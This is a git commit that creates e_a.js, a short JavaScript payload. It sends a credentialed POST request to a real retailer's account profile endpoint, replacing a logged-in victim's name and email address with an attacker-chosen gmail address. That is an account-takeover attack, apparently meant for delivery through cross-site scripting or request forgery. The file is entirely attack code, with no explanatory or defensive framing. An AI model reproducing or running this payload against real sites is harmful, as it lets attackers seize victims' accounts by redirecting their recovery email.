c6c23e0dd71f1fe0ae03fc891d831350132c891a
bbpawolf <57352896+bbpa@users.noreply.github.com>
2024-10-23 17:16:28 +0330

    Create e_a.js

---
+++ e_a.js
@@ -0,0 +1,8 @@
+var xhr=new XMLHttpRequest()
+xhr.open("POST","https://account.kaufland.com/pages-web/profile?_data=routes%2F%24pages%2Fprofile")
+xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded")
+xhr.withCredentials=true;
+xhr.onreadystatechange=()=>{if(xhr.readyState==4){
+alert('done')
+}}
+xhr.send(`__rvfInternalFormId=ProfileForm&given_name=test&family_name=test&email=vampire01${Math.floor(Math.random() * (1000)) + 100 }%40gmail.com&mobile_number=`);
